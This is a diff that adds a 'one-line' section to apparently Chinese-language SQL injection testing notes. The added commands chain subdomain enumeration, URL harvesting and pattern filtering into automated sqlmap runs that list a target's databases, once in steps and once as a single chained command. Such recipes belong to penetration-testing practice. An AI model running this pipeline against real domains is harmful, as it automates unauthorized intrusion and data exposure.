@@ -23,6 +23,24 @@
 
 
 
+## one-line
+
+```
+subfinder -d http://target.com > subs
+cat subs | httpx > subs.alive
+cat subs.alive | gau_go -b jpg,png,gif > urls.check
+gf_go sqli urls.check > urls.sqli
+sqlmap -m urls.sqli --dbs --batch --random-agent
+```
+
+联动
+
+```
+cat subs.alive | gau_go -b jpg,png,gif > urls.check && gf_go sqli urls.check > urls.sqli && sqlmap -m urls.sqli --dbs --batch --random-agent
+```
+
+
+
 ## 测试语句
 
 ```
